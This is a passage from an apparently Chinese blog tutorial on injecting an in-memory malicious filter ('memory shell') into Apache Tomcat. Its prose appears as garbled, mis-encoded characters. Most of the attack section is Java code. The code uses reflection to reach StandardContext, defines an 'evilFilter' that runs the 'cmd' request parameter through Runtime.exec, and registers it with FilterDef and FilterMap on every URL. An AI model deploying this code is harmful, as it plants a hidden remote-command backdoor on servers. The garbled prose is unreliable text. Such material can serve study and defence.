<p>æˆ‘ä»¬ç°åœ¨æ¥çœ‹ä¸€ä¸‹<strong>è·å–åˆ°çš„contextçš„é‡ç‚¹å†…å®¹</strong>ï¼ŒåŠ ä¸€ä¸ªæ–­ç‚¹çœ‹ä¸€ä¸‹ï¼ˆè¿™é‡Œä»¥æˆ‘çš„è‡ªå®šä¹‰äº†ä¸¤ä¸ªfilterä¸ºä¾‹ï¼‰ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055927.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831195448827"
	
	
></p>
<p>åœ¨è¿™ä¸ªStandardContextå¯¹è±¡ä¸­åŒ…å«äº†filterConfigsã€filterDefsã€filterMapsï¼Œç°åœ¨æ¥åˆ†åˆ«è¯´æ˜ä¸€ä¸‹ã€‚</p>
<h6 id="filterconfigs">filterConfigs
</h6><p>åœ¨StandardContextä¸­çš„å®šä¹‰ä¸ºï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055562.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901124501407"
	
	
></p>
<p>ç‚¹å¼€å‰é¢æ–­ç‚¹æƒ…å†µå¦‚ä¸‹ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055645.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901124421253"
	
	
></p>
<p>æ˜¯ä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜å‚¨çš„ï¼Œæœ‰ä¸‰ä¸ªï¼Œä»¥ä¸€ä¸ªä¸ºä¾‹ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055670.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831201155348"
	
	
></p>
<p>å¯ä»¥çœ‹å‡ºfilterConfigsåŒ…å«äº†å½“å‰ä¸Šä¸‹æ–‡çš„ä¿¡æ¯ StandardContextã€filterDefç­‰ä¿¡æ¯</p>
<p>è¿™é‡Œçš„ filterDef å­˜æ”¾äº†filter çš„å®šä¹‰ï¼ŒåŒ…æ‹¬filterClassã€filterNameç­‰ä¿¡æ¯ã€‚å…¶å®å°±æ˜¯web.xmlä¸­çš„<code> &lt;filter&gt;</code>æ ‡ç­¾ã€‚</p>
<h6 id="filterdefs">filterDefs
</h6><p>å®ƒåœ¨StandardContextä¸­çš„å®šä¹‰ä¸ºï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055333.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901124322837"
	
	
></p>
<p>ç‚¹å¼€å¦‚ä¸‹ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055954.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901124651999"
	
	
></p>
<p>filterDefsæ˜¯ä¸€ä¸ªHashMapï¼Œä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜å‚¨ filterDefï¼Œç‚¹å¼€å…¶ä¸­ä¸€ä¸ªçœ‹çœ‹ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055042.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831201641952"
	
	
></p>
<h6 id="filtermaps">filterMaps
</h6><p>filterMaps ä¸­å°±å‚¨å­˜åˆ°äº†å¾ˆå¤šæœ‰ç”¨çš„ä¿¡æ¯ï¼Œä»¥arrayçš„å½¢å¼å­˜æ”¾äº†å„filterçš„è·¯å¾„æ˜ å°„ä¿¡æ¯ï¼Œå…¶å¯¹åº”çš„æ˜¯web.xmlä¸­çš„<code>&lt;filter-mapping&gt;</code>æ ‡ç­¾ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055168.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831202049163"
	
	
></p>
<p>è¿™é‡Œæˆ‘å°†è‡ªå®šä¹‰çš„ä¸¤ä¸ªfilteræ ‡å‡ºæ¥äº†ã€‚ä»ä¸­å¯ä»¥çœ‹å‡º<strong>filteré¡ºåºæ˜¯å¯¹çš„</strong>ï¼Œä¹Ÿæœ‰ä¸€äº›å¿…è¦çš„ä¿¡æ¯ã€‚</p>
<p>â€”â€”â€”â€”</p>
<p>æ‰€ä»¥åé¢çš„è·å–filterMapsçš„ä»£ç :</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055188.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831202302689"
	
	
></p>
<p>åº”è¯¥å°±æ˜¯è·å–åˆ°å°±æ˜¯filterMapsã€‚</p>
<p>â€”â€”â€”â€”â€”â€”</p>
<p>ä»ä¸Šé¢å°±å¯ä»¥çœ‹å‡ºæ¥<strong>Contextå«æœ‰filterçš„å¿…è¦ä¿¡æ¯</strong>ã€‚</p>
<h5 id="å¦‚ä½•æ”»å‡»">å¦‚ä½•æ”»å‡»
</h5><h6 id="åŠ¨æ€æ³¨å†Œfilter">åŠ¨æ€æ³¨å†ŒFilter
</h6><p>ä»å‰é¢çš„åˆ†æå¯ä»¥çŸ¥é“ï¼Œåªè¦æˆ‘ä»¬å‘web.xmlä¸­æ³¨å†Œä¸€ä¸ªfilterï¼Œç„¶åæˆ‘ä»¬å°†è¿™ä¸ªfilterå¯¹åº”ä»£ç è®¾ç½®æˆæ¶æ„ä»£ç ï¼Œå°±èƒ½å®ç°å‘½ä»¤æ³¨å…¥ã€‚</p>
<p>ä½†æ˜¯åœ¨å®é™…ç¯å¢ƒä¸­æ˜¯ä¸å¯èƒ½æœ‰è¿™ç§æƒ…å†µçš„ã€‚é‚£ä¹ˆè¯¥å¦‚ä½•è§£å†³å‘¢ã€‚</p>
<p>åœ¨å‰é¢çš„åˆ†æä¸­ï¼Œæˆ‘ä»¬åˆ†æäº†ApplicationFilterChainçš„filtersçš„èµ‹å€¼è¿‡ç¨‹ï¼Œè°ƒç”¨äº†ApplicationFilterFactoryç±»çš„createFilterChain()æ–¹æ³•ï¼Œå…¶ä¸­çš„<strong>filterMapså³ä¸ºå…¶ä¸­é‡è¦çš„ä¸€ç¯</strong>ã€‚</p>
<p>æ—¢ç„¶<strong>å…³é”®éƒ½æ˜¯filterMapsäº†ï¼Œé‚£ä¹ˆè¿™é‡ŒåŒæ ·çš„å¾ˆå…³é”®çš„å˜é‡å°±æ˜¯context</strong>ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055192.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831210610244"
	
	
></p>
<p>è¿™é‡Œå°±ä¼šè·å–åˆ°StandardContextå®ä¾‹ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥<strong>å€Ÿç”¨Javaåå°„æ¥ä¿®æ”¹filterConfigsï¼ŒfilterDefsï¼ŒfilterMapsè¿™ä¸‰ä¸ªå˜é‡</strong>ï¼Œå°†æˆ‘ä»¬æ¶æ„æ„é€ çš„FIlternameä»¥åŠå¯¹åº”çš„urlpatternå­˜æ”¾åˆ°FilterMapsï¼Œä»è€Œè¾¾åˆ°å†…å­˜æ³¨å…¥çš„æ“ä½œ</p>
<p><strong>è¯´æ˜ä¸€ä¸‹åŠ¨æ€æ·»åŠ æ¶æ„Filterçš„æ€è·¯</strong>ï¼š</p>
<ol>
<li>è·å–å½“å‰webåº”ç”¨çš„StandardContextå¯¹è±¡</li>
<li>åˆ›å»ºæ¶æ„Filter</li>
<li>ä½¿ç”¨FilterDefå¯¹Filterè¿›è¡Œå°è£…ï¼Œå¹¶æ·»åŠ å¿…è¦çš„å±æ€§</li>
<li>åˆ›å»ºfilterMapç±»ï¼Œå¹¶å°†è·¯å¾„å’ŒFilternameç»‘å®šï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterMapsä¸­</li>
<li>ä½¿ç”¨ApplicationFilterConfigå°è£…filterDefï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterConfigsä¸­ã€‚</li>
</ol>
<h6 id="è·å–standardcontextå¯¹è±¡">è·å–StandardContextå¯¹è±¡
</h6><p>StandardContextå¯¹è±¡ä¸»è¦ç”¨æ¥ç®¡ç†Webåº”ç”¨çš„ä¸€äº›å…¨å±€èµ„æºï¼Œå¦‚Sessionã€Cookieã€Servletç­‰ã€‚å› æ­¤æœ‰å¾ˆå¤šæ–¹æ³•æ¥è·å–StandardContextå¯¹è±¡ã€‚</p>
<p>è¿™é‡Œè¦ç”¨åˆ°ServletContextï¼Œç®€å•è¯´æ˜ä¸€ä¸‹ServletContextè·ŸStandardContextçš„å…³ç³»ï¼š</p>
<p>Tomcatä¸­å®ç°ServletContextæ¥å£çš„æœ‰å¦‚ä¸‹ä¸‰ä¸ªï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055395.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831212433092"
	
	
></p>
<p>ï¼ˆå†…è¡¨ç¤ºç»§æ‰¿çš„çˆ¶ç±»å®ç°äº†æ¥å£ä½†æœ¬ç±»æ²¡æœ‰ç›´æ¥å¼•å…¥æ¥å£ï¼‰</p>
<p>è¿™é‡Œé‡ç‚¹å…³æ³¨ApplicationContextç±»å’ŒApplicationContextyFacadeç±»ã€‚</p>
<p><strong>åœ¨webåº”ç”¨ä¸­è·å–çš„ServletContextå®é™…ä¸Šæ˜¯ApplicationContextFacadeå¯¹è±¡</strong>ï¼Œå¯¹ApplicationContextè¿›è¡Œäº†å°è£…ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055533.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831214051758"
	
	
></p>
<p>è€ŒApplicationContextå®ä¾‹ä¸­åˆåŒ…å«äº†StandardContextå®ä¾‹ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055623.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831214339678"
	
	
></p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055768.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831214306688"
	
	
></p>
<p>å½“æˆ‘ä»¬èƒ½ç›´æ¥è·å– request çš„æ—¶å€™ï¼Œå¯ä»¥ç›´æ¥å°†Servlet è½¬ä¸º StandardContextï¼Œä»è€Œè·å–contextã€‚</p>
<p><strong>è·å–contextæµç¨‹å¦‚ä¸‹ï¼š</strong></p>
<p><u>ServletContext -&gt; ApplicationContextï¼š</u></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ServletContext</span><span class="w"> </span><span class="n">servletContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rerquest</span><span class="p">.</span><span class="na">getSession</span><span class="p">().</span><span class="na">getServletContext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Field</span><span class="w"> </span><span class="n">context0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">context0</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ApplicationContext</span><span class="w"> </span><span class="n">applicationContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ApplicationContext</span><span class="p">)</span><span class="n">context0</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">servletContext</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œæ˜¯ä¸ºäº†è·å–åˆ°(ApplicationContext)contextï¼Œå³contextå˜é‡å¯¹åº”çš„ApplicationContextç±»å®ä¾‹ã€‚</p>
<p><u>ApplicationContext -&gt; StandardContextï¼š</u></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Field</span><span class="w"> </span><span class="n">context1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">applicationContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">context1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">StandardContext</span><span class="w"> </span><span class="n">standardContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="n">context1</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">applicationContext</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œæ˜¯ä¸ºäº†è·å–åˆ°(StandardContext)contextï¼Œæ‰€ä»¥ç°åœ¨æˆ‘ä»¬å°±è·å–åˆ°äº†StandardContextç±»å‹çš„contextï¼Œå’Œå‰é¢createFilterChain()æ–¹æ³•ä¸­è·å–åˆ°çš„contextå˜é‡å¯¹åº”ã€‚</p>
<h6 id="åˆ›å»ºæ¶æ„filter">åˆ›å»ºæ¶æ„filter
</h6><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Filter</span><span class="w"> </span><span class="n">evilFilter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Filter</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">(</span><span class="n">FilterConfig</span><span class="w"> </span><span class="n">filterConfig</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">,</span><span class="w"> </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">filterChain</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Runtime</span><span class="w"> </span><span class="n">runtime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">runtime</span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">filterChain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">servletRequest</span><span class="p">,</span><span class="n">servletResponse</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">destroy</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">};</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h6 id="å¦‚ä½•å°è£…">å¦‚ä½•å°è£…
</h6><p>æ—¢ç„¶å‰é¢æˆ‘ä»¬è·å–åˆ°äº†StandardContextå‹çš„contextï¼Œåœ¨å‰é¢çš„è¡¥å……ä¸­ï¼Œä¹Ÿè¯´æ˜è¿™ä¸ªcontextå˜é‡ä¸­å¾ˆé‡è¦çš„ä¸‰ç‚¹ï¼šfilterConfigsã€filterDefsã€filterMapsã€‚</p>
<p>æ‰€ä»¥å…¶å®è¿™é‡Œçš„é‡ç‚¹å°±æ˜¯å¦‚ä½•æ›´æ”¹è¿™ä¸‰ä¸ªå˜é‡ä»è€Œåœ¨createFilterChain()æ–¹æ³•ä¸­è·å–filterMapsæ—¶å¯ä»¥åŠ å…¥æ¶æ„çš„filterã€‚</p>
<p><strong>çœ‹StandardContextæºç ï¼Œå…ˆè¯´æ˜å…¶ä¸­å‡ ä¸ªæ–¹æ³•</strong>ï¼š</p>
<p><strong>addFilterDef()</strong></p>
<p>æ·»åŠ ä¸€ä¸ª<strong>filterDef</strong>åˆ°Contextï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055759.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831220924498"
	
	
></p>
<p>è¿™é‡Œçš„filterDefså˜é‡å®šä¹‰ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055834.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831221127977"
	
	
></p>
<p>æ‰€ä»¥å°±æ˜¯æ·»åŠ ä¸€ä¸ªé”®å€¼å¯¹è¿›å»ã€‚</p>
<p><strong>addFilterMapBefore</strong></p>
<p>æ·»åŠ <strong>filterMap</strong>åˆ°æ‰€æœ‰filteræœ€å‰é¢ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055983.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831221334165"
	
	
></p>
<p><strong>ApplicationFilterConfig</strong></p>
<p>è¿˜æœ‰ä¸ªå°±æ˜¯<strong>filterConfigs</strong>ï¼Œä½†æ˜¯è¿™ä¸ªä¸æ˜¯å•çº¯çš„ä¸€ä¸ªadd&hellip;å°±å¯ä»¥åŠ å…¥ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055879.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831222245447"
	
	
></p>
<p>å†çœ‹ä¸€ä¸‹filterConfigså˜é‡çš„å®šä¹‰ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055084.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831222352219"
	
	
></p>
<p>æ‰€ä»¥åŒæ ·æ˜¯æ”¾å…¥é”®å€¼å¯¹ã€‚</p>
<p>ä»ä»£ç ä¸­å¯ä»¥çœ‹å‡ºåœ¨è¿™é‡Œä¼šè°ƒç”¨ApplicationFilterrConfigçš„æ„é€ æ–¹æ³•ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055181.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831222552209"
	
	
></p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p>
<p>ç°åœ¨å°±å¯ä»¥å¼€å§‹å°è¯•æ„é€ äº†ï¼š</p>
<p><strong>FilterDef</strong></p>
<p><strong>è¿™ä¸ªç±»ä½äº</strong><code>org.apache.tomcat.util.descriptor.web.FilterDef;</code>ï¼Œæˆ‘ä»¬å¯ä»¥å®ä¾‹åŒ–ä¸€ä¸ªFilterDefå¯¹è±¡ï¼Œå¹¶å°†æ¶æ„æ„é€ çš„æ¶æ„ç±»æ·»åŠ åˆ°filterDefä¸­ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//å‰é¢åˆ›å»ºæ¶æ„filteræ˜¯ç”¨çš„åŒ¿åå†…éƒ¨ç±»çš„æ–¹å¼åˆ›å»ºçš„ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥publicå£°æ˜ä¸€ä¸ªæ¶æ„çš„filterç±»ï¼Œåˆ©ç”¨æ–¹å¼ä¸åŒè€Œå·²ã€‚</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;badFilter&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">FilterDef</span><span class="w"> </span><span class="n">filterDef</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FilterDef</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//è®¾ç½®filteråç§°</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">filterDef</span><span class="p">.</span><span class="na">setFilterName</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//å£°æ˜filterç±»ä»£ç æº</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">filterDef</span><span class="p">.</span><span class="na">setFilterClass</span><span class="p">(</span><span class="n">evilFilter</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">filterDef</span><span class="p">.</span><span class="na">setFilter</span><span class="p">(</span><span class="n">evilFilter</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//æ·»åŠ filterDef</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">standardContext</span><span class="p">.</span><span class="na">addFilterDef</span><span class="p">(</span><span class="n">filterDef</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥å’Œå‰é¢è¡¥å……é‡Œç»™å‡ºçš„ç›¸å¯¹åº”çš„filteDefsçš„å›¾ç‰‡å¯¹æ¯”ä¸€ä¸‹ï¼Œå¤§æ¦‚å°±èƒ½çŸ¥é“è¿™é‡Œä½¿ç”¨çš„æ–¹æ³•æ˜¯å¹²å˜›çš„ã€‚</p>
<p><strong>filterMaps</strong></p>
<p><strong>è¿™ä¸ªç±»ä½äº</strong><code>org.apache.tomcat.util.descriptor.web.FilterMap</code>ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦å®ä¾‹åŒ–ä¸€ä¸ªFilteMapå¯¹è±¡ï¼Œå¹¶å°†filteMapæ·»åŠ åˆ°æ‰€æœ‰filteæœ€å‰é¢ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">FilterMap</span><span class="w"> </span><span class="n">filterMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FilterMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//è®¾ç½®æ‹¦æˆªè·¯ç”±</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">filterMap</span><span class="p">.</span><span class="na">addURLPattern</span><span class="p">(</span><span class="s">&#34;/*&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//name=badFilter</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">filterMap</span><span class="p">.</span><span class="na">setFilterName</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">filterMap</span><span class="p">.</span><span class="na">setDispatcher</span><span class="p">(</span><span class="n">DispatcherType</span><span class="p">.</span><span class="na">REQUEST</span><span class="p">.</span><span class="na">name</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//æ·»åŠ æˆ‘ä»¬çš„filterMapåˆ°æ‰€æœ‰filterræœ€å‰é¢</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">standardContext</span><span class="p">.</span><span class="na">addFilterMapBefore</span><span class="p">(</span><span class="n">filterMap</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œé‡ç‚¹è§£é‡Šä¸€ä¸‹<code>filterMap.setDispatcher(DispatcherType.REQUEST.name());</code>ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯ç”¨æ¥è®¾ç½®FilterMapçš„å½“å‰çŠ¶æ€ï¼Œè¯¥çŠ¶æ€è¡¨ç¤ºä½•æ—¶åº”ç”¨è¿‡æ»¤å™¨ã€‚åœ¨è¿™é‡Œè¡¨ç¤ºä¸€ä¸ªç›´æ¥çš„å®¢æˆ·ç«¯è¯·æ±‚ï¼Œä¹Ÿå°±æ˜¯å½“ç”¨æˆ·ç›´æ¥è¯·æ±‚ä¸€ä¸ªèµ„æºæˆ–è€…é‡å®šå‘åˆ°è¾¾è¯¥èµ„æºæ—¶ï¼Œä¼šè§¦å‘è¿‡æ»¤å™¨ã€‚</p>
<p><strong>filterConfig</strong></p>
<p>filterConfigsä¸­å­˜æ”¾filterConfigçš„æ•°ç»„ï¼Œå¹¶ä¸”ä»å‰é¢è¡¥å……æ¿å—çš„å›¾ä¸­ï¼Œå¯ä»¥çœ‹å‡ºfilterConfigä¸­å­˜æ”¾æœ‰filterDefå’Œfilteå¯¹è±¡ç­‰ä¿¡æ¯ã€‚</p>
